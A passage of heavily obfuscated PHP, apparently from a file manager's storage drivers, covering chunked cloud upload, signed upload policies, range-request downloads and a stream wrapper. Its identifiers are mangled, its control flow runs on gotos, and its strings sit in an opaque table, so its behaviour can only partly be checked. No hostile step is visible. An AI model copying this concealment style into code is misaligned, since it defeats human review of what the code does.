d¹ê©İ«Ã¨; d¹ê©İ«Ã¨: $f×á§˜É©á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D‡ìŒ¥¼³Ğ = IO::size($dƒ®ó´±Ëˆ); if ($D‡ìŒ¥¼³Ğ <= 1024 * 1024 * 200) { $D‹’•¿ç ò = array($f×á§˜É©á[1309] . $dƒ®ó´±Ëˆ); $fÅ ÜÜ³Ä = $this->ussRequest($A˜èŸ”ÆÉ¥, $f×á§˜É©á[222], $D‹’•¿ç ò); return $fÅ ÜÜ³Ä[$f×á§˜É©á[1050]] ? $this->getPathOuter($A˜èŸ”ÆÉ¥) : !1; } goto bĞ¬ÆÅâ¦›; aóÖùÌÔï†: if (!$fÅ ÜÜ³Ä[$f×á§˜É©á[1050]]) { return !1; } $C–†…®³‰ = $fÅ ÜÜ³Ä[$f×á§˜É©á[1052]]; $f›Áª¸ïÓ = 0; goto C’¨Ã´¥”è; D½åÙ¼œëç: do { $cø´´ƒŠ­ = $C–†…®³‰[$f×á§˜É©á[1315]]; fseek_64($d”‰¬´ì¶×, $f›Áª¸ïÓ); $dœ®îä = fread($d”‰¬´ì¶×, $cø´´ƒŠ­); $F¹á‹îŞ‚ø = 0; do { $F¹á‹îŞ‚ø++; $C–†…®³‰ = $this->uploadPart($A˜èŸ”ÆÉ¥, $C–†…®³‰, $dœ®îä); } while (!$C–†…®³‰ && $F¹á‹îŞ‚ø < 3); if (!$C–†…®³‰) { return !1; } $bù“›ÔÚÎº = $C–†…®³‰[$f×á§˜É©á[1314]]; $f›Áª¸ïÓ += $cø´´ƒŠ­; } while ($bù“›ÔÚÎº != -1); fclose($d”‰¬´ì¶×); $C°Ì…ñ´¹ì = array($f×á§˜É©á[1316], $f×á§˜É©á[1317] . $C–†…®³‰[$f×á§˜É©á[1318]], $f×á§˜É©á[1312]); goto EŠ½ĞîèÒ; C’¨Ã´¥”è: $bù“›ÔÚÎº = $C–†…®³‰[$f×á§˜É©á[1314]]; $d”‰¬´ì¶× = fopen($dƒ®ó´±Ëˆ, $f×á§˜É©á[1219]); if (!$d”‰¬´ì¶×) { return !1; } goto D½åÙ¼œëç; EŠ½ĞîèÒ: $fÅ ÜÜ³Ä = $this->ussRequest($A˜èŸ”ÆÉ¥, $f×á§˜É©á[222], !1, $C°Ì…ñ´¹ì); return $fÅ ÜÜ³Ä[$f×á§˜É©á[1050]] ? $this->getPathOuter($cèà…â®Äï) : !1; goto cÇİĞ ¦ÓÖ; bĞ¬ÆÅâ¦›: $eŒ×á¸Ç„ñ = 1024 * 1024 * 10; $C°Ì…ñ´¹ì = array($f×á§˜É©á[1310], $f×á§˜É©á[1311] . $D‡ìŒ¥¼³Ğ, $f×á§˜É©á[1312], $f×á§˜É©á[1313] . $eŒ×á¸Ç„ñ); $fÅ ÜÜ³Ä = $this->ussRequest($A˜èŸ”ÆÉ¥, $f×á§˜É©á[222], !1, $C°Ì…ñ´¹ì); goto aóÖùÌÔï†; cÇİĞ ¦ÓÖ: } private function uploadPart($d‡…—ßå¾©, $bÉ†ø™Ñù, &$c¾œ‡ßÁ‹´) { $a•±Ä…Ñœ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f² Ö‘Ëˆ = array($a•±Ä…Ñœ[1319], $a•±Ä…Ñœ[1317] . $bÉ†ø™Ñù[$a•±Ä…Ñœ[1318]], $a•±Ä…Ñœ[1320] . $bÉ†ø™Ñù[$a•±Ä…Ñœ[1314]], $a•±Ä…Ñœ[138] . $bÉ†ø™Ñù[$a•±Ä…Ñœ[1315]]); $eõ¿Éã‰É  = $this->ussRequest($d‡…—ßå¾©, $a•±Ä…Ñœ[222], $c¾œ‡ßÁ‹´, $f² Ö‘Ëˆ); return !$eõ¿Éã‰É [$a•±Ä…Ñœ[1050]] ? $eõ¿Éã‰É [$a•±Ä…Ñœ[1050]] : $eõ¿Éã‰É [$a•±Ä…Ñœ[1052]]; } public function uploadFormData($f„õÅº¯Ë, $DÂÎ”Œ£«Ñ = 3600) { return $this->uploadPolicy($f„õÅº¯Ë, $DÂÎ”Œ£«Ñ); } public function multiUploadFormData($c’ß¹öÖ¨Š, $c´ùÓ†ƒ×× = 3600) { $f°ø™˜–™ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Aì±ñ©†‰À = (int) $GLOBALS[$f°ø™˜–™ò[7]][$f°ø™˜–™ò[77]]; return $this->uploadPolicy($c’ß¹öÖ¨Š, $c´ùÓ†ƒ××, $Aì±ñ©†‰À); } private function uploadPolicy($a‹é¢“ŠÍ¯, $C¬Ğ»‹öëÇ = 3600, $c¯¡…»ë„² = 0) { goto e¾Ú•µÙá; D”´ì”‹­: $aÆ™Ø¨›ç´ = array($f‹‰ƒ•ƒ ˆ[1321] => $this->bucket, $f‹‰ƒ•ƒ ˆ[1322] => $a‹é¢“ŠÍ¯, $f‹‰ƒ•ƒ ˆ[1323] => time() + $C¬Ğ»‹öëÇ, $f‹‰ƒ•ƒ ˆ[1324] => $CÊ…š¯âˆ÷); if ($c¯¡…»ë„²) { $aÆ™Ø¨›ç´[$f‹‰ƒ•ƒ ˆ[1235]] = $c¯¡…»ë„²; } $FèÓ¬æãÆí = base64_encode(json_encode($aÆ™Ø¨›ç´)); goto e™»ø·ò¿‹; e¾Ú•µÙá: $f‹‰ƒ•ƒ ˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dòö¦›¼ = $f‹‰ƒ•ƒ ˆ[8] . $this->bucket; $CÊ…š¯âˆ÷ = gmdate($f‹‰ƒ•ƒ ˆ[1256]); goto D”´ì”‹­; e™»ø·ò¿‹: $c‘å†œÂê = base64_encode(hash_hmac($f‹‰ƒ•ƒ ˆ[1291], "\x50\117\123\124\x26{$Dòö¦›¼}\46{$CÊ…š¯âˆ÷}\46{$FèÓ¬æãÆí}", md5("{$this->userpass}"), !0)); $bíË´á²Çè = array($f‹‰ƒ•ƒ ˆ[1162] => $FèÓ¬æãÆí, $f‹‰ƒ•ƒ ˆ[1325] => "\x55\120\131\x55\x4e\40{$this->username}\x3a{$c‘å†œÂê}", $f‹‰ƒ•ƒ ˆ[173] => $this->endpoint . $Dòö¦›¼); return $bíË´á²Çè; goto e§Š‹ñ¤‚Û; e§Š‹ñ¤‚Û: } public function download($A£¦»Ğ¥Ã, $eÂª¾Ñ‰¢) { goto Eƒ‚Î°‚; Eƒ‚Î°‚: $Dê£ôõ÷´Õ = IO::getPathInner(IO::mkfile($eÂª¾Ñ‰¢)); if (!($C¼®¬¯ª™¦ = $this->link($A£¦»Ğ¥Ã))) { return !1; } $b»í¨¥²‹Ã = 0; goto c†¦¾‡¹Ğ—; c†¦¾‡¹Ğ—: $Føî”½‰ŸÎ = 1024 * 200; $b©„´ˆ¨ğ = fopen($Dê£ôõ÷´Õ, $_SERVER[ÈİÅ¿ÈÈ¥×][1275]); while (!0) { $c…¾ÊÄöâ› = $this->fileSubstr($A£¦»Ğ¥Ã, $b»í¨¥²‹Ã, $Føî”½‰ŸÎ); if ($c…¾ÊÄöâ› === !1) { return !1; } fwrite($b©„´ˆ¨ğ, $c…¾ÊÄöâ›); $b»í¨¥²‹Ã += $Føî”½‰ŸÎ; if (strlen($c…¾ÊÄöâ›) < $Føî”½‰ŸÎ) { break; } } goto BÃ§ŠÙŒ©é; BÃ§ŠÙŒ©é: fclose($b©„´ˆ¨ğ); return $eÂª¾Ñ‰¢; goto DçÛì…ªàŞ; DçÛì…ªàŞ: } public function link($CˆÂò†©ÒÄ, $a˜±ÔÏŒØ® = array()) { $D¿ƒ‚İÜ®è =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CˆÂò†©ÒÄ = trim($CˆÂò†©ÒÄ, $D¿ƒ‚İÜ®è[8]); if (!empty($this->token)) { $cè‘îÓ¦´ = strtotime(date($D¿ƒ‚İÜ®è[1326])); $Bèñ…÷ôïå = substr(md5($this->token . $D¿ƒ‚İÜ®è[278] . $cè‘îÓ¦´ . $D¿ƒ‚İÜ®è[1327] . $CˆÂò†©ÒÄ), 12, 8) . $cè‘îÓ¦´; $a˜±ÔÏŒØ®[] = $D¿ƒ‚İÜ®è[1328] . $Bèñ…÷ôïå; } $A§ßÖîÔÅì = !empty($a˜±ÔÏŒØ®) ? $D¿ƒ‚İÜ®è[69] . implode($D¿ƒ‚İÜ®è[278], $a˜±ÔÏŒØ®) : $D¿ƒ‚İÜ®è[33]; return $this->getHost() . $D¿ƒ‚İÜ®è[8] . $CˆÂò†©ÒÄ . $A§ßÖîÔÅì; } public function fileOut($dÓï¿¦¤Œ, $F…²µ—¡ = false, $C¶ÀÜ«êœ± = false, $d‘¢²ªºè´ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dÓï¿¦¤Œ, $F…²µ—¡, $C¶ÀÜ«êœ±, $d‘¢²ªºè´); } if (!$C¶ÀÜ«êœ±) { $C¶ÀÜ«êœ± = $this->pathThis($dÓï¿¦¤Œ); } $fÕ‘»ˆë‡à = $F…²µ—¡ ? array($_SERVER[ÈİÅ¿ÈÈ¥×][1329] . rawurlencode($C¶ÀÜ«êœ±)) : array(); $a½£¹å–±ˆ = $this->link($dÓï¿¦¤Œ, $fÕ‘»ˆë‡à); $this->fileOutLink($a½£¹å–±ˆ); } public function fileOutServer($F¸¨ÃÊ†”, $e¬à™§íË¡ = false, $B¨”×Ô‹ìß = false, $dˆÓÊ’’Â = '') { parent::fileOut($F¸¨ÃÊ†”, $e¬à™§íË¡, $B¨”×Ô‹ìß, $dˆÓÊ’’Â); } public function fileOutImage($c¿¦§Ùª¤, $CùƒªğÖ¾Ñ = 250) { $F§ÍèŠ¼§î = $this->link($c¿¦§Ùª¤ . $_SERVER[ÈİÅ¿ÈÈ¥×][1330] . $CùƒªğÖ¾Ñ); $this->fileOutLink($F§ÍèŠ¼§î); } public function fileOutImageServer($Có·İ˜×Šö, $eÉ§éÆ´ = 250) { parent::fileOutImage($Có·İ˜×Šö, $eÉ§éÆ´); } public function hashMd5($bÎí“–Ï“Ã) { $Cä®ê¸‘°¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f…‰¦•«ßÕ = $this->_objectMeta($bÎí“–Ï“Ã); return isset($f…‰¦•«ßÕ[$Cä®ê¸‘°¼[204]]) ? $f…‰¦•«ßÕ[$Cä®ê¸‘°¼[204]] : !1; } public function size($A±Ù¿Á±ºˆ) { $câĞÒ†Ø¦ = $this->objectMeta($A±Ù¿Á±ºˆ); return $câĞÒ†Ø¦ ? $câĞÒ†Ø¦[$_SERVER[ÈİÅ¿ÈÈ¥×][77]] : 0; } public function info($e´èÂÈ™¿×) { if ($this->isFolder($e´èÂÈ™¿×)) { return $this->folderInfo($e´èÂÈ™¿×); } else { if ($this->isFile($e´èÂÈ™¿×)) { return $this->fileInfo($e´èÂÈ™¿×); } } return !1; } public function exist($A²ê¡–¡„) { return $this->isFile($A²ê¡–¡„) || $this->isFolder($A²ê¡–¡„); } public function isFile($DŸù Í¿Ã) { return !$this->isFolder($DŸù Í¿Ã) && $this->objectMeta($DŸù Í¿Ã); } public function isFolder($F¸ğæšğÚ¡) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][195], $F¸ğæšğÚ¡); } protected function objectMeta($F¨ÎĞ¥÷á¬) { return $this->cacheMethod($_SERVER[ÈİÅ¿ÈÈ¥×][196], $F¨ÎĞ¥÷á¬); } protected function _objectMeta($DŒ×ßï°) { goto D¸“°Î”â; D¸“°Î”â: $eŠ¹Ü¿ï—Ü =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($DŒ×ßï° == $eŠ¹Ü¿ï—Ü[33] || $DŒ×ßï° == $eŠ¹Ü¿ï—Ü[8]) { return array(); } $Câ‰©µ´÷½ = $this->ussRequest($DŒ×ßï°, $eŠ¹Ü¿ï—Ü[1331]); goto AÚõœ¤»–İ; F•ê–÷Ö: $Cö¸Ó•õğÍ = array($eŠ¹Ü¿ï—Ü[29] => isset($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1332]]) ? $dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1332]] : null, $eŠ¹Ü¿ï—Ü[77] => isset($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1333]]) ? $dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1333]] : null, $eŠ¹Ü¿ï—Ü[204] => isset($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1334]]) ? $dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1334]] : null, $eŠ¹Ü¿ï—Ü[1301] => isset($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1335]]) ? $dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1335]] : null); $Cö¸Ó•õğÍ[$eŠ¹Ü¿ï—Ü[1302]] = isset($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1336]]) ? strtotime($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1336]]) : $Cö¸Ó•õğÍ[$eŠ¹Ü¿ï—Ü[1301]]; return $Cö¸Ó•õğÍ; goto BÚÁåâ ®Ù; AÚõœ¤»–İ: if (!$Câ‰©µ´÷½[$eŠ¹Ü¿ï—Ü[1050]]) { return null; } $dÚšø‚‡´„ = isset($Câ‰©µ´÷½[$eŠ¹Ü¿ï—Ü[1052]]) ? $Câ‰©µ´÷½[$eŠ¹Ü¿ï—Ü[1052]] : array(); if (!isset($dÚšø‚‡´„[$eŠ¹Ü¿ï—Ü[1332]])) { return null; } goto F•ê–÷Ö; BÚÁåâ ®Ù: } protected function _isFolder($dÑªÅÑ²†«) { $aç§Ššôˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($dÑªÅÑ²†« == $aç§Ššôˆ[33] || $dÑªÅÑ²†« == $aç§Ššôˆ[8]) { return !0; } $b»´°ù§ßÁ = $this->_objectMeta($dÑªÅÑ²†«); return isset($b»´°ù§ßÁ[$aç§Ššôˆ[29]]) && $b»´°ù§ßÁ[$aç§Ššôˆ[29]] == $aç§Ššôˆ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Eç¾åáŸ‘ = false) { } public function exist($aÇØªÈ‡Ğ™) { $DÄí‹®óï¿ = $this->info($aÇØªÈ‡Ğ™); return $DÄí‹®óï¿[$_SERVER[ÈİÅ¿ÈÈ¥×][191]]; } public function isFile($C´İ¶§ßªó) { $a†”ãçƒ¸Ã = $this->info($C´İ¶§ßªó); return $a†”ãçƒ¸Ã[$_SERVER[ÈİÅ¿ÈÈ¥×][191]]; } public function isFolder($dáÆÅ²é„Ú) { return !1; } public function size($CÓĞò‚) { $eŠÕµÙ´¸ = $this->info($CÓĞò‚); return $eŠÕµÙ´¸[$_SERVER[ÈİÅ¿ÈÈ¥×][77]]; } public function info($Eò»ÈĞòÛœ) { return $this->infoParse($Eò»ÈĞòÛœ); } public function infoAuth($a‘ÏÓé½´¦) { return $this->infoParse($a‘ÏÓé½´¦); } public function infoWithChildren($D›ßÒÔ®ä¾) { return $this->infoParse($D›ßÒÔ®ä¾); } public function infoFull($e›ÓØö’÷) { return $this->infoParse($e›ÓØö’÷); } private function infoParse($béŸÆñ¿™Ë) { $fõ•ÂëèÔè =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bÀ«²½­ƒ = $this->header($béŸÆñ¿™Ë); if (!$bÀ«²½­ƒ || !$bÀ«²½­ƒ[$fõ•ÂëèÔè[697]]) { return !1; } $c»ßĞ¡ÆÄ‡ = _get($bÀ«²½­ƒ, $fõ•ÂëèÔè[331], 0); $bÌôÛœäå‹ = array($fõ•ÂëèÔè[28] => $bÀ«²½­ƒ[$fõ•ÂëèÔè[28]], $fõ•ÂëèÔè[75] => $béŸÆñ¿™Ë, $fõ•ÂëèÔè[29] => $fõ•ÂëèÔè[171], $fõ•ÂëèÔè[77] => intval($c»ßĞ¡ÆÄ‡), $fõ•ÂëèÔè[165] => get_path_ext($bÀ«²½­ƒ[$fõ•ÂëèÔè[28]]), $fõ•ÂëèÔè[1216] => $c»ßĞ¡ÆÄ‡ > 0 && $bÀ«²½­ƒ[$fõ•ÂëèÔè[1337]], $fõ•ÂëèÔè[1217] => !1); return $bÌôÛœäå‹; } private function header($AÃ®‘îÃÌ±) { goto F…ò¦—ù»…; F…ò¦—ù»…: $E†º¡§°Ş =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset(self::$_cacheHeader[$AÃ®‘îÃÌ±])) { return self::$_cacheHeader[$AÃ®‘îÃÌ±]; } $c¼†šß‰‰Ó = isset($GLOBALS[$E†º¡§°Ş[1338]]) ? $GLOBALS[$E†º¡§°Ş[1338]] : !1; goto EÆÙ¡ÌÙäá; EÆÙ¡ÌÙäá: $GLOBALS[$E†º¡§°Ş[1338]] = !0; self::$_cacheHeader[$AÃ®‘îÃÌ±] = url_header($AÃ®‘îÃÌ±); $GLOBALS[$E†º¡§°Ş[1338]] = $c¼†šß‰‰Ó; goto DßÜêÇò±; DßÜêÇò±: return self::$_cacheHeader[$AÃ®‘îÃÌ±]; goto aÑ³Å££…í; aÑ³Å££…í: } public function hashSimple($CßÈÙİ¦‰î, $Aµ‡öšêÖÄ = false) { goto b±Î–î¦¼›; b±Î–î¦¼›: $B‰´ÛËÅÆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dƒ„½¦—® = $this->info($CßÈÙİ¦‰î); if (!$Dƒ„½¦—® || !$Dƒ„½¦—®[$B‰´ÛËÅÆ[191]]) { return !1; } goto A‚ÈÛêõ—; CÄÏ·Ç–›: $F‹Ú…¨ÚÏ¨ = timeFloat(); $Aø»ä‚¶‡ = 15; for ($CÉ÷‹´é» = 0; $CÉ÷‹´é» < $C‰ğÊ›˜ÎÖ; $CÉ÷‹´é»++) { if (timeFloat() - $F‹Ú…¨ÚÏ¨ > $Aø»ä‚¶‡) { return !1; } $c¾Åî¸Ë– = $this->fileSubstr($CßÈÙİ¦‰î, $b†êİ”‚— * $CÉ÷‹´é», $c äĞ±Ì·); if (!$c¾Åî¸Ë–) { return !1; } $dŸòÑŸèÇ .= $c¾Åî¸Ë–; } goto b£‚â†óƒ; b£‚â†óƒ: $dŸòÑŸèÇ .= $this->fileSubstr($CßÈÙİ¦‰î, $A…ŸÖ¬Ûôß - $c äĞ±Ì·, $c äĞ±Ì·); return md5($dŸòÑŸèÇ) . $A…ŸÖ¬Ûôß; goto F°ÜºÉİ×; F×¦‰İêÏ¹: if ($A…ŸÖ¬Ûôß <= $c äĞ±Ì· * $C‰ğÊ›˜ÎÖ) { return md5($this->fileSubstr($CßÈÙİ¦‰î, 0, $A…ŸÖ¬Ûôß)) . $A…ŸÖ¬Ûôß; } $b†êİ”‚— = intval($A…ŸÖ¬Ûôß / $C‰ğÊ›˜ÎÖ); $dŸòÑŸèÇ = $B‰´ÛËÅÆ[33]; goto CÄÏ·Ç–›; A‚ÈÛêõ—: $A…ŸÖ¬Ûôß = $Dƒ„½¦—®[$B‰´ÛËÅÆ[77]]; $c äĞ±Ì· = 200; $C‰ğÊ›˜ÎÖ = 50; goto F×¦‰İêÏ¹; F°ÜºÉİ×: } public function getContent($Eä½’­Ô×) { return $this->fileSubstr($Eä½’­Ô×); } public function fileSubstr($FùäÄ¢åİµ, $e‰‚»Ñ›øÚ = 0, $EÁÁíÒì†Œ = -1) { goto Fë®é°ÕÓÅ; dƒ–Ñ‡˜ğ: if ($EÁÁíÒì†Œ === -1) { $EÁÁíÒì†Œ = $eââ‰Ø‡ÜÓ[$FáÉÀ®¶¹†[77]]; } if ($EÁÁíÒì†Œ == 0) { return $FáÉÀ®¶¹†[33]; } $BøÖÁÂè°÷ = array($FáÉÀ®¶¹†[1339] . $e‰‚»Ñ›øÚ . $FáÉÀ®¶¹†[723] . ($e‰‚»Ñ›øÚ + $EÁÁíÒì†Œ - 1)); goto C²†Â–¯ò÷; Fë®é°ÕÓÅ: $FáÉÀ®¶¹† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eââ‰Ø‡ÜÓ = $this->info($FùäÄ¢åİµ); if (!$eââ‰Ø‡ÜÓ || !$eââ‰Ø‡ÜÓ[$FáÉÀ®¶¹†[191]] && $eââ‰Ø‡ÜÓ[$FáÉÀ®¶¹†[77]] > 1024 * 1024 * 10) { return !1; } goto dƒ–Ñ‡˜ğ; C²†Â–¯ò÷: $AÃ˜™„À™é = url_request($FùäÄ¢åİµ, $FáÉÀ®¶¹†[224], !1, $BøÖÁÂè°÷, !1, !1, 1); return $AÃ˜™„À™é[$FáÉÀ®¶¹†[1052]] ? $AÃ˜™„À™é[$FáÉÀ®¶¹†[1052]] : $FáÉÀ®¶¹†[33]; goto CÛ„ĞÒŒ’; CÛ„ĞÒŒ’: } public function download($F¶…”–‘…È, $aĞ´Á«â²—) { Downloader::start($F¶…”–‘…È, $aĞ´Á«â²—); return $aĞ´Á«â²—; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($F¸ï„§„¼©, $EÒ¥Ñ®Ëç¬ = '') { goto BŠ§…ñ ‘’; BŠ§…ñ ‘’: $this->info = $this->info($F¸ï„§„¼©); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]; goto dÉ†×ßÛ‚Ú; Aø‹±ÀåÅÉ: return $this->info ? !0 : !1; goto föİŞ‹•‹–; dÉ†×ßÛ‚Ú: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$F¸ï„§„¼©])) { self::$_chunkBuffer[$F¸ï„§„¼©] = array(); } goto Aø‹±ÀåÅÉ; föİŞ‹•‹–: } function stream_read($CâòËâÙº¯) { $b”´Ÿä‚ = $this->fileSubstr($this->pose, $CâòËâÙº¯); $this->pose += strlen($b”´Ÿä‚); return $b”´Ÿä‚; } public function stream_tell() { return $this->pose; } public function stream_seek($f§­ö…´ô, $d°ŒòŞàÊ) { $dëÆŒÅö¯ï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($d°ŒòŞàÊ == SEEK_SET) { $this->pose = $f§­ö…´ô; } else { if ($d°ŒòŞàÊ == SEEK_CUR) { $this->pose += $f§­ö…´ô; } else { if ($d°ŒòŞàÊ == SEEK_END) { $this->pose = $this->info[$dëÆŒÅö¯ï[77]] + intval($f§­ö…´ô); } } } if ($f§­ö…´ô < 0) { $this->pose = $this->info[$dëÆŒÅö¯ï[77]] + $f§­ö…´ô; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÈİÅ¿ÈÈ¥×][77]]; } public function stream_close() { return !0; } public function url_stat($fÙæº„š–é, $F‡Ä¥¥´¹Š) { $bƒ¡Ô»”òœ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f‰²ï¯—Î˜ = $this->info($fÙæº„š–é); return array($bƒ¡Ô»”òœ[1340] => 0, $bƒ¡Ô»”òœ[1341] => 0, $bƒ¡Ô»”òœ[12] => 32768 + 511, $bƒ¡Ô»”òœ[1342] => 0, $bƒ¡Ô»”òœ[1343] => 0, $bƒ¡Ô»”òœ[1344] => 0, $bƒ¡Ô»”òœ[1345] => 0, $bƒ¡Ô»”òœ[77] => $f‰²ï¯—Î˜[$bƒ¡Ô»”òœ[77]], $bƒ¡Ô»”òœ[1346] => $f‰²ï¯—Î˜[$bƒ¡Ô»”òœ[1215]], $bƒ¡Ô»”òœ[1302] => $f‰²ï¯—Î˜[$bƒ¡Ô»”òœ[107]], $bƒ¡Ô»”òœ[1301] => $f‰²ï¯—Î˜[$bƒ¡Ô»”òœ[190]], $bƒ¡Ô»”òœ[1347] => 0, $bƒ¡Ô»”òœ[1348] => 0); } static $fileInfo = array(); public function info($A¦ØŞªšĞô) { $CÅ‡Ş…ä° = $_SERVER[ÈİÅ¿ÈÈ¥×][1349]; if (isset(self::$fileInfo[$A¦ØŞªšĞô])) { return self::$fileInfo[$A¦ØŞªšĞô]; } if (substr($A¦ØŞªšĞô, 0, strlen($CÅ‡Ş…ä°)) != $CÅ‡Ş…ä°) { return !1; } self::$fileInfo[$A¦ØŞªšĞô] = IO::info(substr($A¦ØŞªšĞô, strlen($CÅ‡Ş…ä°))); return self::$fileInfo[$A¦ØŞªšĞô]; } public static function read($FÉñËõË‘á, $E„Ï½ï·É, $fŒ…¡±¦) { goto E®ºƒ„¥¿²; eŒ†¸š ãù: $dØ¿è«¼Å = 8192; fseek($E§‹¼‚²âŒ, $E„Ï½ï·É, SEEK_SET); $Cì¬²Ûœ•Ø = $DåÜ…·…ÛŞ[33]; goto F—‚Œ‘™¿±; E®ºƒ„¥¿²: $DåÜ…·…ÛŞ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E§‹¼‚²âŒ = fopen($FÉñËõË‘á, $DåÜ…·…ÛŞ[1219]); if (!$E§‹¼‚²âŒ) { return $DåÜ…·…ÛŞ[33]; } goto eŒ†¸š ãù; F—‚Œ‘™¿±: $c©¢¬Á£Ö = 0; while ($c©¢¬Á£Ö < $fŒ…¡±¦) { $dÈ¶¦Ö¥”ß = min($dØ¿è«¼Å, $fŒ…¡±¦ - $c©¢¬Á£Ö); $Cì¬²Ûœ•Ø .= fread($E§‹¼‚²âŒ, $dÈ¶¦Ö¥”ß); $c©¢¬Á£Ö += $dÈ¶¦Ö¥”ß; } fclose($E§‹¼‚²âŒ); goto d°¿ñ˜Ôºã; d°¿ñ˜Ôºã: return $Cì¬²Ûœ•Ø; goto AÏÛ±Â‡ŸŒ; AÏÛ±Â‡ŸŒ: } public function fileSubstr($e¼Ù»á†Êˆ, $A¨ÅÀ¤âÙ) { goto d”õĞ‡Ô÷†; d”õĞ‡Ô÷†: $CÍºÏíé›× =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aµñ±ª¨Ïæ = $this->info[$CÍºÏíé›×[77]]; $E»æÚ·Æ®µ = $e¼Ù»á†Êˆ; goto fœ ¡è®ª; fÃªØš: $CÏÛóÓ’„ = 0; $e–ˆ´ËÚ„ = 0; $B‘è‰¡ôá = $CÍºÏíé›×[33]; goto B÷­•à¡Ù©; f°‘«Š²ÂŞ: $DÑ§ãó¤¨ğ = ceil(($e¼Ù»á†Êˆ + $A¨ÅÀ¤âÙ) / $cŠºÔÌ·—Ë) * $cŠºÔÌ·—Ë - $BŞ¬…§¸˜; $d»ÃÂ›¬· = IO::fileSubstr($this->path, $BŞ¬…§¸˜, $DÑ§ãó¤¨ğ); $D’ÅÜÒÔ»[$BŞ¬…§¸˜ . $CÍºÏíé›×[33]] = $d»ÃÂ›¬·; goto dÃçÃ´±éÈ; B÷­•à¡Ù©: foreach ($D’ÅÜÒÔ» as $CÏÛóÓ’„ => $B‘è‰¡ôá) { $CÏÛóÓ’„ = intval($CÏÛóÓ’„); $e–ˆ´ËÚ„ = $CÏÛóÓ’„ + strlen($B‘è‰¡ôá); if ($e¼Ù»á†Êˆ >= $e–ˆ´ËÚ„) { continue; } if ($e¼Ù»á†Êˆ >= $CÏÛóÓ’„ && $e¼Ù»á†Êˆ + $A¨ÅÀ¤âÙ <= $e–ˆ´ËÚ„) { return substr($B‘è‰¡ôá, $e¼Ù»á†Êˆ - $CÏÛóÓ’„, $A¨ÅÀ¤âÙ); } break; } if (count($D’ÅÜÒÔ») > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($CÍºÏíé›×[1350], $CÍºÏíé›×[1351] . count($D’ÅÜÒÔ») . "\73\x73\x74\x61\x72\164\75{$e¼Ù»á†Êˆ}\x2c\154\145\x6e\147\x74\x68\75{$A¨ÅÀ¤âÙ}\x3b\160\157\x73\145\72{$CÏÛóÓ’„}\x7e{$e–ˆ´ËÚ„}"); throw new Exception($CÍºÏíé›×[1352]); } $BŞ¬…§¸˜ = intval($e¼Ù»á†Êˆ / $cŠºÔÌ·—Ë) * $cŠºÔÌ·—Ë; goto f°‘«Š²ÂŞ; dÃçÃ´±éÈ: ksort($D’ÅÜÒÔ»); $Eº„çÃÓŸÖ = substr($d»ÃÂ›¬·, $e¼Ù»á†Êˆ - $BŞ¬…§¸˜, $A¨ÅÀ¤âÙ); return $Eº„çÃÓŸÖ; goto e†æâÚÁÒé; Dí‰ÎšĞïÏ: $cŠºÔÌ·—Ë = 64 * 1024; $D’ÅÜÒÔ» =& self::$_chunkBuffer[$this->path]; if (!$D’ÅÜÒÔ») { $D’ÅÜÒÔ» = array(); } goto fÃªØš; EœÃ†öŒêà: if ($e¼Ù»á†Êˆ + $A¨ÅÀ¤âÙ > $aµñ±ª¨Ïæ) { $A¨ÅÀ¤âÙ = $aµñ±ª¨Ïæ - $e¼Ù»á†Êˆ; } if ($A¨ÅÀ¤âÙ <= 0) { return $CÍºÏíé›×[33]; } if ($e¼Ù»á†Êˆ < 0 || $e¼Ù»á†Êˆ >= $aµñ±ª¨Ïæ || $A¨ÅÀ¤âÙ <= 0 || $A¨ÅÀ¤âÙ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\151\154\x65\x52\x65\141\x64\x20\145\162\x72\157\x72\x21\x20\x73\164\141\x72\x74\x3d{$e¼Ù»á†Êˆ}\x3b\x6c\x65\x6e\147\x74\150\75{$A¨ÅÀ¤âÙ}\73\x20\x73\x69\172\x65\x3d{$aµñ±ª¨Ïæ}\73"); } goto Dí‰ÎšĞïÏ; fœ ¡è®ª: $B»è²ƒ’È§ = $A¨ÅÀ¤âÙ; if ($e¼Ù»á†Êˆ < 0) { $e¼Ù»á†Êˆ = $aµñ±ª¨Ïæ + $e¼Ù»á†Êˆ; } if ($A¨ÅÀ¤âÙ === !1) { $A¨ÅÀ¤âÙ = $aµñ±ª¨Ïæ - 